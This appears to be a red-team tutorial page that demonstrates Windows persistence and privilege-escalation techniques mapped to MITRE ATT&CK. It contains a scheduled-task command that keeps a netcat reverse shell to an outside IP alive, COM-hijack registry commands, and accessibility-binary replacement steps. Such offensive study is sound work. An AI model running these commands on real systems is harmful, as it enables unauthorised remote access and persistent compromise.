![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRheYwpVDyXf_syX3MS%2F-MRhehlcnL95GwAMaWo7%2Fimage.png?alt=media&token=aed692aa-0ec8-4ba7-ac46-442deec3e78a)

I placed a simple bat script on the startup menu so when the user logs back in this will get executed.

Demo:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FYmlb4HbzxfsSdJ8eBNhz%2FStartupFolder.gif?alt=media&token=bae1bbf3-a8f8-45e5-9828-1563bc318981)

**Registry Run Keys:**

From here we will also create a new Registry Key at User Level Permission and have it execute our code.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhHsm8IuA-I8poix0h%2Fimage.png?alt=media&token=5d8c7bd5-b471-4a70-82d3-b5521a82cae0)

This code will get Execute every time a user logs in after every reboot or shutdown. We can see how it works in the following Demo.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhHwynnEamF0PRk99t%2FRegistryKeyRun-Sample.gif?alt=media&token=19ead3f1-2ad0-406b-b981-bef78c18ee01)

## t1197-bits-jobs

Adversaries may abuse BITS jobs persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updates, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

The interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool.

Adversaries may abuse BITS to download, execute and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).

BITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol.

In the following example I will create a simple bitsadmin job with user Privileges this will start a calc process to execute.

First we use the /create option to create our job

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhHQy4iHJgIxe6ZNLr%2Fimage.png?alt=media&token=19bfe3b8-d5f6-484e-a1d5-1a8eb96eec42)

We will attach a file as well:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhHPCtA-UJsmpNG3p8%2Fimage.png?alt=media&token=66c32a6e-a9e5-40cd-a694-452be91fb020)

A file needs to be created for the job to function properly.

Then we will use the SetNotifyCmdLine Parameter this will set a program to execute for notification, and can optionally take parameters. These options can also be NULL.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhHQ6sMtPfOwuFHTyv%2Fimage.png?alt=media&token=20827727-b4a0-4f52-9c10-8fcfbe022ba0)

Too much of an extra step but we will call cmd to start a calc process on our job

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhHRuDy4uuyAthh-aD%2Fimage.png?alt=media&token=25f48efe-3aed-4cc9-99fb-49aabf7ed5f8)

Demo:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhHFLvttKgY6bV3sia%2F-MRhI5u9Sp5UxfhkntAF%2FBitsAdmin-Sample.gif?alt=media&token=74460b51-06fd-4fe3-ac9e-6270d5d223f3)

References:

LOLBAS

## t1053-scheduled-tasks-job

Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified data and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments).

Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.

Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).

### shared-modules

Adversaries may abuse shared modules to execute malicious payloads. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like CreateProcess, Loadlibrary, etc. of the Win32 API.

The module loader can load DLLs:

Via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;

Via Export forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);

Via an NTFS junction or symlink program.exe.lcaol with the fully-qualified or relative pathname of a directory containing DLLs specified in the IMPORT directory or forwarded EXPORTS;

Via <file name=filename.extension" loadfrom="fully-qualified or relative pathname"> in an embedded or external application manifest". The file name refers to an entry in the IMPORT directory or forwarded EXPORT.

Adversaries may use this functionality as a way to execute arbitrary code on a victim system. For example, malware may execute share modules to load additional components or features.

### scheduled-task

Utilities such as 

**at**

 and 

**schtasks**

, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on.Scheduling a task on a remote system typically required being a member of the Administrators group on the remote system.

An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct a remote Execution as part of Lateral movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.

Let's create a task that keep a reverse shell alive every minute.

schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr 'c:\Users\User\Downloads/nc.exe 192.168.56.103 1337 -e cmd.exe'

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhDVj4APC12TCWJPB2%2F-MRhEQK9QNp0tVKNgVBn%2FSCHTASK-nc.gif?alt=media&token=9e562315-02a3-46bc-900d-2ec81da447e2)

As we can see here creating a task can be done with a simple syntax and I demonstrated with nc.exe binary which takes also arguments!, all that was needed is to be inside the double-quotes ("") and it will take arguments with spaces.These tasks can also be created remotely. All that is needed is the user to be an administrator or have proper permissions on the Remote machine.

In the schtasks help menu we see the arguments needed after 

/create

 to create a task on a remote server. We can supply the username and password on the arguments to authenticate and create the task.

It would look something like this.

schtasks /create /s "PC-NAME" /tn "My App" /tr "PATH" /sc minute /mo 1 /u Domain\User /p password

 [If password is not supplied it will prompt asking for one]

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhDVj4APC12TCWJPB2%2F-MRhEUZkWu1rQnvbkGlO%2Fimage.png?alt=media&token=39296749-aeef-4004-bce1-77ad91bde043)

### at-windows

Adversaries may abuse the at.exe utility to perform task scheduling for initial or recurring execution of malicious code. The at utility exists as an executable within Windows for scheduling tasks at a specified time and date. Using at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group.

An adversary may use at.exe in Windows environments to execute programs at system startup or on scheduled basis for persistence. At can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).

Note: The at.exe command line utility has been deprecated in current versions of Windows in favor of schtasks.

Sample:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkAgCETyyyshu4OELI%2F-MRkAkyTkXLnf4aVfjkt%2Fimage.png?alt=media&token=7e5f6a80-2e7d-488f-8e2c-b2dc9715d530)

## t1098-account-manipulation

Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.

Demo



When an adversary has sufficient permissions on the System usually a method for persistence which can be caught easily but still an effective method is to change the permissions of a group or simple it's permissions from that we can use the net.exe tool to add a user onto the machine and into the Administrators Group in this example it will be a local account and not a domain account

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhGez1Qhg-3jrU_-dA%2F-MRhHCwx5kxAHvo9wJmW%2Fimage.png?alt=media&token=1b9a3eba-d512-4b07-af30-45d07f2fb637)

The Adrian Local Account will be added to the Administrators Group with the right permission

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhGez1Qhg-3jrU_-dA%2F-MRhHB_japzGc2JSug-c%2Fimage.png?alt=media&token=a239f9bf-034d-4cbe-83e8-0dc463c3e8b9)

And we see that the user already has Administrators permissions, this technique thought reliable and easy to catch, sometimes it flies under the Radar because of Default accounts on the Windows System that a normal user won't even think twice about it.

# privilege-escalation

The adversary is trying to gain higher-level permissions.

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include:

·         SYSTEM/root level

·         Local Administrator

·         User Account with admin-like access to specific system or perform specific function.

These techniques often overlap with Persistence Techniques, as OS features that let an adversary persist can execute in an elevated context.

## untitled-3

Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor user activity such as running specific applications/binaries.

Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.

Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.

### powershell-profile

Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile (profile.ps1) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments.

PowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer.

Adversaries may modify these profiles to include arbitrary commands, functions, modules and/or PowerShell drives to gain persistence. Every time a user opens a PowerShell sessions the modified script will be executed unless the -NoProfile flag is used when it is launched.

An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.

Example:

PowerShell Profile is a PowerShell script which you can customize to your environment and add session specific elements to every PowerShell session that you Start.

It's a script that runs when PowerShell starts. You can use profiles as a logon script to customize the environment. You can add Commands, Functions, Aliases, Modules, etc.

PowerShell supports several profile files. Also, PowerShell host programs can support their own host-specific profiles.

A few Samples:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhLdzPhVwvvWhac6Li%2F-MRhNBtWNjl_tPuP4LTc%2Fimage.png?alt=media&token=f34afe3b-0abf-4cf3-99b7-17fbce2c8128)

The PowerShell profile script is stored in the folder 

**“WindowsPowerShel”**

 which is by default is hidden from the user. If a payload has been dropped into disk the “

**Start-Process**

” cmdlet can be used to point to the location of the Executable. The “Test-Path” determines if a profile exists for the current user. If the profile doesn’t exist the Command “

**New-Item -Path $Profile -Type File -Force**

” will create a profile for the current users and the “

**Out-File**

” will rewrite the profile.

First let’s create a Profile:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhLdzPhVwvvWhac6Li%2F-MRhNCu-bfKiwzqIcBaP%2Fimage.png?alt=media&token=acbee862-5686-4f92-b1a8-a8391ca47ec2)

Then I will add the command I want to be executed when a New PowerShell Session is initiated.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhLdzPhVwvvWhac6Li%2F-MRhNDm5hj9Lx6239mQ9%2Fimage.png?alt=media&token=ac686555-f685-4ab0-ab8c-97e3ffa81734)

Now every New PowerShell will run my Executable Command and connect back to my Attacking Machine.

Runs every Second

These are just a few demonstrations that I wanted to share they are simple and very easy to follow, If you would love to go more into Detail please do check out the MITRE Framework as it’s a great guide to understand and check out various techniques used by APT’s.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhLdzPhVwvvWhac6Li%2F-MRhNij9sC-MEm7aPcdY%2Fpersistence-penv.gif?alt=media&token=ef6065ad-2acd-4b58-8474-7c58fda38bf8)

### component-object-model-hijacking

Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system. References to various COM objects are stored in the Registry.

Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operations the adversary's code will be executed instead. An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.

**Example:**

For this example I will search for instances of applications trying to load objects that don't exist.

Process Monitor is a great tool to search for these objects it's part of the Sysinternals Suite and it shows everything in real time. When running procmon we will apply a filter since it gets bloated with a ton of information that in this case won't be necessary, so what we are looking for here is:

· Result is NAME NOT FOUND

· Operations is RegOpenKey

· Path ends with InprocServer32

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhNpXc1Hvxd1uuObdO%2F-MRhNyd9cOWq7N4c_Trs%2Fimage.png?alt=media&token=9d6ac4c2-94a2-4085-b075-3ccafedef256)

In a few minutes I get a ton of results, since this is a Clean VM almost everything is from Explorer and Firefox mainly:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhNpXc1Hvxd1uuObdO%2F-MRhNznXSX8cGYjgmZMK%2Fimage.png?alt=media&token=518876c7-806a-4537-b728-688b37e257ec)

One of the things I noticed is probably the times it is being called, In my testing I went for Explorer since it is being called plenty of times in a matter of seconds but It usually failed, I have no idea why, (Please do explain if you know @dmcxblue).

From here create a Simple DLL Project from Visual Studio and have it open a MessageBox, I wrote "Hello hacker", it will need 3 arguments so just use NULL on the other 2 and your last being Hello hacker message.

Once we have our DLL built we will transfer it to the host machine and register it to the proper CLSID but we are assuming here that we have a terminal and not a GUI Desktop so for this simple demo we will.

We will locate the CLSID that we are currently aiming to Hijack and we will change the location of the DLL that it is currently trying to load:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhNpXc1Hvxd1uuObdO%2F-MRhO06H9Ews45rOVSrz%2Fimage.png?alt=media&token=34807911-f379-471e-ad82-c132bfc201ef)

Once we find ti and replace this, we will wait for a while (10 min in my occasion) and we will get greeted with a message (we are trying to gain persistence as an Administrator, but in this Demo I reached for a user level persistence)

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhNpXc1Hvxd1uuObdO%2F-MRhO199FItEHAG-ew8r%2Fimage.png?alt=media&token=66686979-cf55-49da-9c60-10f7fbbf15fd)

Tip: We can also use Powershell

New-Item -Path "HKU:\S-1-5-21-214746808-1661000321-346206657-1108_Classes\Wow6432Node\CLSID\" -Name "{F1C46D71-B791-4110-8D5C-7108F22C1010}"

New-Item -Path "HKU:\S-1-5-21-214746808-1661000321-346206657-1108_Classes\Wow6432Node\CLSID\{F1C46D71-B791-4110-8D5C-7108F22C1010}" -Name "InprocServer32" -Value "C:\Temp\HelloHacker.dll"

New-ItemProperty -Path "HKU:\S-1-5-21-214746808-1661000321-346206657-1108_Classes\Wow6432Node\CLSID\{F1C46D71-B791-4110-8D5C-7108F22C1010}\InprocServer32" -Name "ThreadingModel" -Value "Both"

References:

​

### application-shimming

Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming features allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10.

Within the framework, shims are created to act as a buffer between the program ( or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS.

A list of all shims currently installed by the default Windows Installer (sdbinst.exe) is kept in:

· %WINDIR%\AppPatch\sysmain.sdb and

· hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb

Custom databases are stored in:

· %WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom and

· hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom

To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to bypass User Account Control (UAC and RedirectEXE), injects DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).

Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. Shims can also be abused to establish persistence by continuously being invoked by affected programs.

### accessibility-features

Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

Two common accessibility programs are C:\Windows\System32\sethc.exe, launched when the shift key is pressed five times and C:\Windows\System32\utilman.exe, launched when the Windows + U key combination is pressed.

The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen.

Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\, and it must be protected by Windows File or Resource Protection (WFP/WRP). The Image File Execution Option Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.

For simple binary replacement on Windows XP and later as well as Windows Server 2003/R2 and later, for example, the program (e.g:C:\Windows\System32\utilman.exe) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges.

Other accessibility features exist that may also be leveraged in a similar fashion:

· On-Screen Keyboard: C:\Windows\System32\osk.exe

· Magnifier: C:\Windows\System32\Magnify.exe

· Narrator: C:\Windows\System32\Narrator.exe

· Display Switcher: C:\Windows\System32\DisplaySwitch.exe

· App Switcher: C:\Windows\System32\AtBroker.exe

Example:

Note: Now in the newer Windows 10 some come with a Trusted Installer Group from the start, mostly on Enterprise Version it's a security feature not even SYSTEM has access the only approach I found was the takeover utility

We find the Accessibility Feature we are trying to abuse for our persistence in this sample OSK(On-Screen Keyboard)

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhLdzPhVwvvWhac6Li%2F-MRhMtBcbsdIe1NAA1T_%2Fimage.png?alt=media&token=c4381dbe-e057-42a5-970b-037e4e9c8312)

We demonstrated where this Accessibility Feature is located we can also use more easier ones such as Utilman.exe this executable has a shortcut of Windows + U

What happens when we replace the binary with a cmd.exe binary and use the Shortcut?

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhLdzPhVwvvWhac6Li%2F-MRhMu26piYYTzDwP8g0%2Fimage.png?alt=media&token=47b70ed9-11dd-4910-ba8a-bdf572c05732)

Windows + U

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhLdzPhVwvvWhac6Li%2F-MRhMuzRWHrEk6Vk5CT3%2Fimage.png?alt=media&token=3d45ad17-8589-4823-b9fe-7c0cb2b5b470)

### screensaver

Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr extension. The Windows screensaver application scrnsave.scr is located in C:\Windows\System32\, and C:\Windows\sysWOW64\ on 64-bit Windows systems, along with screensavers included with base Windows installations.

The following screensaver settings are stored in the Registry (HKCU\Control Panel\Desktop\) and could be manipulated to achieve persistence:

· SCRNSAVE.exe - set to malicious PE path

· ScreenSaveActive - set to '1' to enable the screensaver

· ScreenSaverIsSecure - set to '0' to not require a password to unlock

· ScreenSaveTimeout - sets user inactivity timeout before screensaver is executed

Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.

In this example we will establish persistence with the use of our Screen Saver the current path for the current Screen Saver that is loaded depending on the idle time (1 minute here) will be loaded when the user is inactive during that certain amount of time.

We can see the current value of the Key to what screensaver it is pointing to, if you notice it is using the .scr extension no worries this is just another form of executable so changing the extension name of your payload will work fine as well.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhLR094Ep1VHAfG_W2%2Fimage.png?alt=media&token=abf8bab2-0d0c-4004-bd51-f6f4def85810)

We can vie other key values as well:

Screensaver is Active

Screensavers Timeout (usually this is in seconds)

SCRNSAVE.EXE - The binary it is loading when the idle time has been reached

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhLSWtOITRHMAQZTm3%2Fimage.png?alt=media&token=139bea1b-798f-48b0-bbde-f5aa8b9f906e)

All that we wish to accomplish in this situation is have the screensaver point to our payload. We do not need Administrator privileges in this matter as any user can setup their own screensaver as they would like.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhLUWtyJ0e7KzMa1W8%2Fimage.png?alt=media&token=5cd9c11f-cfae-4c6a-9798-3ae74e6b7cf6)

We wait for the 60 seconds (1 min) to pass an we should receive a shell back to our attacking machine.

**Demo:**

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhLWjmrbBfngbPmaJD%2FScreenSaver-Sample.gif?alt=media&token=5e638d29-0cdf-40c5-bdc9-efa5410709d2)

### default-file-association

Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.

System file associations are listed under HKEY_CLASSES_ROOT.[extension], for example HKEY_CLASSES_ROOT.txt. The entries point to a handler for that extension located at HKEY_CLASSES_ROOT[handler]. The various commands are then listed as subkeys underneath the shell key at HKEY_CLASSES_ROOT[handler]\shell[action]\command. For example: HKEY_CLASSES_ROOT\txtfile\shell\open\command HKEY_CLASSES_ROOT\txtfile\shell\print\command* HKEY_CLASSES_ROOT\txtfile\shell\printto\command

The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.

Example:

On Windows, extensions that are known by the operating system are defined in the registry. For example we have a txt file.

Below we see the one responsible for opening a text file.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhLEFCbpBx44apZbAO%2Fimage.png?alt=media&token=6e42fa70-64e6-4c92-b821-6903838a9439)

Each of these extensions may be connected to some handler, that is also defined in the registry in this case we know .txt are handled by notepad.

In this section the important one we want to know about is the command option:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhLEzvzAm6lIMx-m2z%2Fimage.png?alt=media&token=37fe3091-0105-4bdb-aa51-f1361acb9ad3)

We can see that notepad runs with parameters one of them being (%1) is the name of the file that was clicked. Thanks to this notepad opens the clicked file.

We can replace the value to point it to our payload and gain a shell. But we also don't want to mess with the proper functionality of the execution so we will create a small batch script which calls our payload and the proper program to open the extension. This should be the final settings for the hijack.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhLFfyu-lKxhwaavZd%2Fimage.png?alt=media&token=f839f10c-c70f-4115-8f02-ae3214329c2c)

Then we open regular txt file and check our shell connection.

We have to be lucky and the file note have a (" ") space on the name or this will be taking as 2 different files to be opened

Demo:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhJ5Q3mm3jD_Hm0yRL%2F-MRhLKPicBK8Mw7OT450%2FHijackExtension-Sample.gif?alt=media&token=1964ac26-1796-4163-aa27-d2a4da8b4346)

## untitled-2

Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.

### service-file-permissions-weakness

Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

**Example:**

In this situation a user has PERMISSIONS to designate or modify one of the services run by SYSTEM in this situation we see a normal service already stopped, in this example its Ccleaner, also info on the BinPath that shows where the binary is located in the Windows System.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhZCa9uuvGts_bAsRX%2Fimage.png?alt=media&token=7b736ea1-bf89-4ed5-81e8-959e75f476db)

What if a User has permissions to change this binPath?, simple it can have it point to the malicious payload and when this services is started it will run the malicious payload.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhZDKx-CN1i181Xm2c%2Fimage.png?alt=media&token=97fe0137-fb56-41a0-b8fe-370cce449535)

Same Result but a more simpler configuration modification.

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhZE6SCHGhjEXKDCKL%2Fimage.png?alt=media&token=1ca147da-b197-4e06-9a3b-2244b98b7c28)

### path-interception-by-unquoted-path

Adversaries may execute their ow malicious payloads by hijacking vulnerable path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.

Service paths and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., C:\unsafe path with space\program.exe vs. "C:\unsafe path with pace\program.exe"). (stored in Windows Registry Keys)An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is C:\program files\myapp.exe, an adversary may create a program at C:\program.exe that will be run instead of the intended program.

This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by higher privileged process.

**Example:**

A very popular and well known technique usually some software have very minor but important configurations missing for example Quoting ("") a full path of a file or binary, we are aware that Windows has some folders that contain spaces in them (C:\Program Files\) and these folders or paths without a quote windows sees them as an End Line where that is a termination of a file name, here is the reason why it's necessary to quote the path so windows sees it as a complete path when a space(" ") is in the path name.

It's important to have these quoted paths since windows will not find the assigned file or binary when doing its search when a service is started, in this situation an attacker can take advantage of this and add a malicious payload on a path that come's before the intended one.

A very great tool that I recently have found and its output is very clean is 

**PrivescCheck.**

The output is user friendly and it even has an Highlighted section at the end of its run that puts everything tidied up for you so you can find the vulnerability.

Sample:

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhZ3YHHB0SayS_cfGQ%2Fimage.png?alt=media&token=0168b3cc-906e-408a-a8f3-ecea261e10f2)

So let us pay attention to the Unquoted Path Result

![](https://gblobscdn.gitbook.com/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhZ4NOIn_9IESWVIsg%2Fimage.png?alt=media&token=e001c3e3-ad22-49ce-9d6e-73486c453985)

Look at this Ccleaner is Unquoted and it’s a Service where the Path is Modifiable but we see that the C:\ Path is WRTIE accessible. But unfortunately as a User we don't have permissions to Start or Restart so what best option do we have, well I wouldn't call these Ethical but we can probably Crash the OS and have a force reboot ONLY if it's not possible to Restart as a User. But here for the sake of Demonstration I will Restart it as the Administrator and have my Payload executed.

